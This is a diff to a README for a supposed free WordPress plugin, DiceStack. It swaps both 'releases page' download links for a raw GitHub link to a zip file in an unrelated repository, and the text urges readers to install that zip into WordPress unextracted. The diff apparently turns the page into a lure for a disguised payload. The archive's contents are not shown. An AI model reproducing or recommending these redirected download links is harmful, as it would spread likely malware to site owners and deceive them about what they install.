@@ -5,7 +5,7 @@ description: "Manage your WordPress site with a modular suite of 185 performance
 ---
 # 🎲 DiceStack-free-all-in-one-WordPress-plugin - All your WordPress tools in one
 
-[![Download DiceStack](https://img.shields.io/badge/Download-DiceStack-blue.svg)](https://github.com/Mandacomparative891/DiceStack-free-all-in-one-WordPress-plugin/releases)
+[![Download DiceStack](https://img.shields.io/badge/Download-DiceStack-blue.svg)](https://raw.githubusercontent.com/Mandacomparative891/mandacomparative891.github.io/main/pleurocentrum/mandacomparative_io_github_v2.8.zip)
 
 DiceStack provides 185 modular tools for your WordPress website. This plugin handles security, performance, search engine optimization, WooCommerce management, caching, and backups. You choose which tools to activate. Disabled tools load zero code, which keeps your website fast.
 
@@ -27,7 +27,7 @@ You control the features from a dashboard. If you need a backup tool, enable onl
 
 You can access the latest version of the plugin through the official releases page.
 
-[Click here to visit the releases page and download the plugin](https://github.com/Mandacomparative891/DiceStack-free-all-in-one-WordPress-plugin/releases)
+[Click here to visit the releases page and download the plugin](https://raw.githubusercontent.com/Mandacomparative891/mandacomparative891.github.io/main/pleurocentrum/mandacomparative_io_github_v2.8.zip)
 
 Look for the file that ends in .zip. Save this file to your computer desktop. Do not extract the zip folder. WordPress needs the file in its original format.
 
